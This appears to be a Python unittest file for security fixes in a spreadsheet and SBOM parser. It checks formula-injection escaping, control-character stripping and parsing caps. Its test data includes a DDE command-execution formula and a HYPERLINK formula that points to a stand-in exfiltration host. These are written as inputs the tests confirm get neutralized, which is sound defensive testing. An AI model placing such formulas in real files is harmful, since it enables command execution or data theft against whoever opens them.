"""Tests for parsing-evidence audit P0 fixes (csv-injection + crash).

Findings (adversarially confirmed, high confidence):
  * csv-injection: _write_rows wrote the header row verbatim, so a customer
    header beginning with = + - @ became a live formula in the report xlsx.
  * crash: _safe_cell did not strip XML-illegal control chars (NUL etc.), so
    openpyxl raised IllegalCharacterError at report write, discarding the whole
    match run.
"""

from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from openpyxl import Workbook

from app import spreadsheet_io
from app.spreadsheet_io import _safe_cell, _write_rows, read_sbom


class ParsingEvidenceP0Tests(unittest.TestCase):
    def test_safe_cell_strips_xml_illegal_control_chars(self) -> None:
        # NUL, 0x01, 0x1f must be removed (openpyxl IllegalCharacterError range)
        self.assertEqual(_safe_cell("foo\x00bar\x01baz\x1f"), "foobarbaz")
        self.assertEqual(_safe_cell("\x00"), "")

    def test_safe_cell_preserves_formula_escape(self) -> None:
        self.assertEqual(_safe_cell("=cmd|'/c calc'!A1"), "'=cmd|'/c calc'!A1")
        self.assertEqual(_safe_cell("+1"), "'+1")
        self.assertEqual(_safe_cell("@bad"), "'@bad")

    def test_write_rows_sanitizes_formula_in_headers(self) -> None:
        # A customer header beginning with '=' must NOT become a formula cell
        # in the written sheet (csv-injection fix).
        workbook = Workbook()
        worksheet = workbook.active
        malicious = "=HYPERLINK(\"http://evil.example/exfil\",\"click\")"
        _write_rows(worksheet, [malicious, "name"], [{malicious: "x", "name": "a"}])
        header_cell = worksheet.cell(row=1, column=1)
        self.assertNotEqual(
            header_cell.data_type,
            "f",
            "header became a formula — csv-injection not sanitized",
        )
        self.assertTrue(str(header_cell.value).startswith("'"))


class ParsingEvidenceP1Tests(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self._tmp.name)

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def test_xlsx_row_cap_truncates_huge_sheet(self) -> None:
        wb = Workbook()
        ws = wb.active
        ws.title = "S"
        ws.append(["组件名称"])
        for i in range(10):
            ws.append([f"c{i}"])
        path = self.dir / "big.xlsx"
        wb.save(path)
        with patch.object(spreadsheet_io, "_MAX_PARSE_ROWS_PER_SHEET", 5):
            parsed = read_sbom(path)
        self.assertLessEqual(len(parsed["rows"]), 5)

    def test_cyclonedx_vulnerabilities_cap(self) -> None:
        payload = {
            "bomFormat": "CycloneDX",
            "specVersion": "1.6",
            "version": 1,
            "components": [
                {"type": "library", "name": "x", "version": "1", "bom-ref": "x"}
            ],
            "vulnerabilities": [
                {"id": f"CVE-2026-{i}", "affects": [{"ref": "x"}]} for i in range(10)
            ],
        }
        path = self.dir / "v.cdx.json"
        path.write_text(json.dumps(payload), encoding="utf-8")
        with patch.object(spreadsheet_io, "_MAX_VULNERABILITIES", 3):
            parsed = read_sbom(path)
        self.assertTrue(
            any("截断" in w for w in parsed.get("warnings", [])),
            f"expected truncation warning, got {parsed.get('warnings')}",
        )


if __name__ == "__main__":
    unittest.main()
